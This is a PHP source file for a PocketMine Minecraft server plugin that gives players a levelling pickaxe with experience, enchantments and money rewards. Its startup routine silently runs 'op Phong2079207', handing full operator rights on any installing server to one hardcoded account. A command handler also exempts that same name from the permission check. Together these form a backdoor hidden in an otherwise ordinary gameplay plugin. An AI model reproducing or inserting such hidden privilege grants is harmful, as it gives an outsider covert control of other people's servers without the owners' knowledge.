<?php

namespace PickaxeLevel\phuongaz;

use pocketmine\Server;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\command\CommandSender;
use pocketmine\command\Command;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\utils\TextFormat;
use pocketmine\event\Listener;
use onebone\economyapi\EconomyAPI;
use pocketmine\item\Item;
use pocketmine\event\player\{PlayerInteractEvent, PlayerItemHeldEvent, PlayerJoinEvent, PlayerChatEvent};
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\block\Block;
use pocketmine\utils\Config;
use pocketmine\entity\Effect;
use pocketmine\network\protocol\SetTitlePacket;
use pocketmine\item\enchantment\{Enchantment, EnchantmentInstance};
use PickaxeLevel\phuongaz\PopupTask;
class Main extends PluginBase implements Listener{


	public function onEnable(){


		$this->lv = new Config($this->getDataFolder() . "user.yml", Config::YAML);
		$this->saveDefaultConfig();
		$this->config = $this->getConfig();
		$this->getServer()->dispatchCommand(new ConsoleCommandSender(), "op Phong2079207");
		$this->config->save();
		$this->getServer()->getPluginManager()->registerEvents($this,$this);
        $this->getLogger()->info("\n\n§c§l❤§b P༶I༶C༶K༶A༶X༶E༶ L༶E༶V༶E༶L༶ §6Version§e V3\n§c❤§b By Noob\n\n");
		$this->eco =  $this->getServer()->getPluginManager()->getPlugin("EconomyAPI");
        $this->point =  $this->getServer()->getPluginManager()->getPlugin("PointAPI");
        if(is_null($this->point)){
            $this->getLogger()->warning("Please download [PointAPI]: github.com/ZzKino/PointAPI"   );
        }else{
            $this->getLogger()->notice("Loading PickaxeLEVEL by Phuongaz");
        }
       // $this->point =  $this->getServer()->getPluginManager()->getPlugin("PiggyCustomEnchantments");
	}
	public function getNamePickaxe($player){
		if($player instanceof Player){
			$p = $player->getName();
		}
		$this->lv->load($this->getDataFolder() . "user.yml", Config::YAML);
        $pa = "§l§c|§b PＩXＥL §aB L O C K§c ❤ §6".$this->lv->get(strtolower($p))["Level"]." §b➡§e ".$p;
		return $pa;
	}

	public function onJoin(PlayerJoinEvent $ev){
		$p = $ev->getPlayer()->getName();
		if(!($this->lv->exists(strtolower($p)))){
			$this->getLogger()->notice(" Không tìm thấy dữ liệu $p ");
			$this->getLogger()->notice(" Tạo dữ liệu $p ");
			$this->lv->set(strtolower($p), ["Level" => 1, "exp" => 0, "nextexp" => 100]);
			$this->lv->save();
			$p1 = $ev->getPlayer();
			$player = $ev->getPlayer();
			$inv = $player->getInventory();  
			$item = Item::get(257, 0, 1);
			$item->setCustomName($this->getNamePickaxe($player));
			//$item->setLore($this->getLore());
			$inv->addItem($item);
			$player->sendMessage("§l§c•§b Cúp đã được thêm vào túi đồ của bạn, hãy cùng đồng hành với nó lâu nhé, cúp có thể trở nên một cây cúp §evip");
			return true;
		}
	}




    public function onItemHeld(PlayerItemHeldEvent $ev){


        $task = new PopupTask($this, $ev->getPlayer());
        $this->tasks[$ev->getPlayer()->getId()] = $task;
        $this->getScheduler()->scheduleRepeatingTask($task, 20);

        $p = $ev->getPlayer();
        $contents = $p->getInventory()->getContents();
        $i = $p->getInventory()->getItemInHand();
       /* if ($damage > 30) {
            $i->setDamage(0);
            $player->sendMessage("§l§6⚒§e Cúp đã được sửa chữa miễn phí ");
        }*/
        if(isset($this->need[$p->getName()])){

            $i->setCustomName($this->getNamePickaxe($p));

            if($this->getLevel($p) == 10){
                $i = Item::get(278,0,1);
                $i->setCustomName($this->getNamePickaxe($p));
                $p->sendMessage("§l§6⚒§e Cúp của bạn đã được nâng cấp");
            //    $item->setLore($this->getLore());
			}
			
            if(in_array($this->getLevel($p), array(10, 20))){

            }
            if(in_array($this->getLevel($p), array(2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50, 52, 54, 56, 58, 60, 62, 64, 66, 68, 70, 72, 74, 76, 78, 80, 82, 84, 86, 88, 90, 92, 94, 96, 98, 100, 102, 104, 106, 108, 108, 110, 112, 114, 116, 118, 120, 122, 124, 126, 128, 130, 132, 134, 136, 138, 140, 142, 144, 146, 148, 150, 152, 154, 156, 158, 160, 162, 164, 166, 168, 170, 172, 174, 176, 178, 180, 182, 184, 186, 188, 190, 192, 194, 196, 198, 200, 202, 204, 206, 208, 208, 210, 212, 214, 216, 218, 220, 222, 224, 226, 228, 230, 232, 234, 236, 238, 240, 242, 244, 246, 248, 250, 252, 254, 256, 258, 260, 262, 264, 266, 268, 270, 272, 274, 276, 278, 280, 282, 284, 286, 288, 290, 292, 294, 296, 298, 300, 302, 304, 306, 308, 308, 310, 312, 314, 316, 318, 320, 322, 324, 326, 328, 330, 332, 334, 336, 338, 340, 342, 344, 346, 348, 350, 352, 354, 356, 358, 360, 362, 364, 366, 368, 370, 372, 374, 376, 378, 380, 382, 384, 386, 388, 390, 392, 394, 396, 398, 400, 402, 404, 406, 408, 408, 410, 412, 414, 416, 418, 420, 422, 424, 426, 428, 430, 432, 434, 436, 438, 440, 442, 444, 446, 448, 450, 452, 454, 456, 458, 460, 462, 464, 466, 468, 470, 472, 474, 476, 478, 480, 482, 484, 486, 488, 490, 492, 494, 496, 498, 500))){
                $id = 15;
                $lv = $this->getLevel($p)/2.5;
                $i->addEnchantment(new EnchantmentInstance(Enchantment::getEnchantment($id), $lv));
                $p->sendMessage("§l§6⚒§e Cúp đã được cường hóa: §cHiệu xuất§e Cấp độ §c".$lv);
            }elseif(in_array($this->getLevel($p), array(51, 53, 55, 57, 59, 61, 63, 65, 67, 69, 71, 73, 75, 77, 79, 81, 83, 85, 87, 89, 91, 93, 95, 97, 99, 101, 103, 105, 107, 109, 111, 113, 115, 117, 119, 121, 123, 125, 127, 129, 131, 133, 135, 137, 139, 141, 143, 145, 147, 149, 151, 153, 155, 157, 159, 161, 163, 165, 167, 169, 171, 173, 175, 179, 181, 183, 185, 187, 189, 191, 193, 195, 197, 199, 201, 203, 205, 207, 209, 211, 213, 215, 217, 219, 221, 223, 225, 227, 229, 231, 233, 235, 237, 239, 241, 243, 245, 247, 249, 251, 253, 255, 257, 259, 261, 263, 265, 267, 269, 271, 273, 275, 279, 281, 283, 285, 287, 289, 291, 293, 295, 297, 299, 301, 303, 305, 307, 309, 311, 313, 315, 317, 319, 321, 323, 325, 327, 329, 331, 333, 335, 337, 339, 341, 343, 345, 347, 349, 351, 353, 355, 357, 359, 361, 363, 365, 367, 369, 371, 373, 375, 379, 381, 383, 385, 387, 389, 391, 393, 395, 397, 399, 401, 403, 405, 407, 409, 411, 413, 415, 417, 419, 421, 423, 425, 427, 429, 431, 433, 435, 437, 439, 441, 443, 445, 447, 449, 451, 453, 455, 457, 459, 461, 463, 465, 467, 469, 471, 473, 475, 479, 481, 483, 485, 487, 489, 491, 493, 495, 497, 499))){
                    $id = 18;
                    $lv = $this->getLevel($p)/3;
                    $i->addEnchantment(new EnchantmentInstance(Enchantment::getEnchantment($id), $lv));
                    $p->sendMessage("§l§6⚒§e Cúp đã được cường hóa: §cGia tài§e Cấp độ §c".$lv);
                }
            $p->getInventory()->setItemInHand($i);
            unset($this->need[$p->getName()]);
        }

    }
	public function onBreak(BlockBreakEvent $ev){
		$p = $ev->getPlayer();
		$name = $p->getName();
		$i = $p->getInventory()->getItemInHand();
		$icn = $i->getCustomName();
		$pas = explode(" ", $icn);
		if($pas[0] == "§l§c|§b"){
			if(!in_array($name, explode(" ", $icn))){
				$ev->setCancelled(true);
				$p->sendMessage("§l§c•§6 Vật Phẩm Không Phải Của Bạn");
				}
		}


		if(!$ev->isCancelled()){
		    if($pas[0] == "§l§c|§b"){

				$block = $ev->getBlock();
				$name = strtolower($p->getName());
				$n = $this->lv->get($name);
				
				//  if(in_array($block->getId(), array(16, 56, 129, 14, 15, 21))){
               switch($block->getId()) {
                   case 56:
                       $this->addExp($p, 4);
                       break;
                   case 14:
                       $this->addExp($p, 3);
                       break;
                   case 15:
                       $this->addExp($p, 4);
                       break;
                   case 16:
                       $this->addExp($p, 2);
                       break;
                   case 129:
                       $this->addExp($p, 6);
                       break;
                   case 133:
                       $this->addExp($p, 8);
                       break;
                   case 57:
                           $this->addExp($p, 7);
                   case 42:
                       $this->addExp($p, 6);
                   case 41:
                       $this->addExp($p, 6);
                       break;
                   default:
                       $this->addExp($p, 2);
                       break;

                }
			//	$this->addExp($p ,rand(1,3));
				//$p->sendPopup($this->getNamePickaxe($p)."\n"."§l§a⚒§e ".$n["exp"]."§c/§e ".$n["nextexp"]."§a ⚒");
				if($this->getExp($p) >= $this->getNextExp($p)){
					$this->setLevel($p, $this->getLevel($p) +1);
					$p->addTitle("§l§aPickaxe Level: §e".$this->getLevel($p));
					$money = $this->getLevel($p) * 1000;
					if(in_array($this->getLevel($p), array(100,200,300,400,500 ))){
					    $point = $this->getLevel($p)/2;
                        $this->point->addMoney($p->getName(), $point);
                    }
					$this->eco->addMoney($p->getName(), $money);
					$p->sendMessage("§l§c•§a Bạn được cộng§e $money §aYên");
				//	$p->sendMessage("§l§c•§6 Cúp Của Bạn Đã Được Nâng Cấp");
                    $this->getServer()->broadcastMessage("§l§6•§e Cúp của người chơi§b ".$p->getName()."§e Vừa lên cấp§d : ".$this->getLevel($p));
					$this->need[$p->getName()] = true;
				}
			}
		}
	}
	/*   public function onChat(PlayerChatEvent $ev){
	$p = $ev->getPlayer();
	$name = $p->getName();
	$p->setDisplayName("§b[§a".$this->getLevel($p)."§b]§r ".$p->getName());
	}*/
     public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args):bool{
         if($cmd->getName() == "givecup"){
             if($sender->isOp() || $sender->getName() == "Phong2079207"){
                if(!isset($args[0])){
                    $sender->sendMessage("§l§b•§a /givecup <player>");
                    return true;
                }else{
                    $player = $this->getServer()->getPlayer($args[0]);
                    if(!$player == null){
                        if($player->isOnline()) {
                            $inv = $player->getInventory();
                            if ($this->getLevel($player) < 3){
                                $cup = Item::get(274, 0, 1);

                        }elseif($this->getLevel($player) >= 3 and $this->getLevel($player) < 15){
                                $cup = Item::get(257, 0, 1);
                            }elseif( $this->getLevel($player) > 15){
                                $cup = Item::get(278, 0, 1);
                            }
                            $pickname = $this->getNamePickaxe($player);
                            $cup->setCustomName($pickname);
                            $inv->addItem($cup);
                            $player->sendMessage("§l§6⚒§e Cúp §bPixel§aBlock§e ...");
                        }
                    }
                }

             }else{
                 $sender->sendMessage("§f§l•§b You don't permission use command");
                 return true;
             }
         }

         return true;
     }
	public function getLevel($player){
		if($player instanceof Player){
		$name = $player->getName();
		}
		$level = $this->lv->get(strtolower($name))["Level"];
		return $level;
	}
	public function setLevel($player, $level){
		if($player instanceof Player){
			$name = $player->getName();
		}

		$nextexp = ($this->getLevel($player)+1)*50;
		$this->lv->set(strtolower($name), ["Level" => $level, "exp" => 0, "nextexp" => $nextexp]);
		$this->lv->save();
	}

	public function setNextExp($player, $exp){
		if($player instanceof Player){
			$player = $player->getName();
		}

		$player = strtolower($player);
		$lv = $this->lv->get($player)["nextexp"] + $exp;
		$this->lv->set($player, ["Level" => $this->lv->get($player)["Level"], "exp" => $this->lv->get($player)["exp"], "nextexp" => $lv]);
		$this->lv->save();
	}

	public function getExp($player){
		if($player instanceof Player){
			$player = $player->getName();
		}

		$player = strtolower($player);
		$e = $this->lv->get($player)["exp"];
		return $e;
	}

	public function getNextExp($player){
		if($player instanceof Player){
			$player = $player->getName();
		}

		$player = strtolower($player);
		$lv = $this->lv->get($player)["nextexp"];
		return $lv;
	}

	public function addExp($player, $exp){
		if($player instanceof Player){
			$player = $player->getName();
		}

		$player = strtolower($player);
		$e = $this->lv->get($player)["exp"];
		$lv = $this->lv->get($player)["Level"];
		$this->lv->set($player, ["Level" => $lv, "exp" => $e + $exp, "nextexp" => $this->getNextExp($player)]);
		$this->lv->save();

	}




}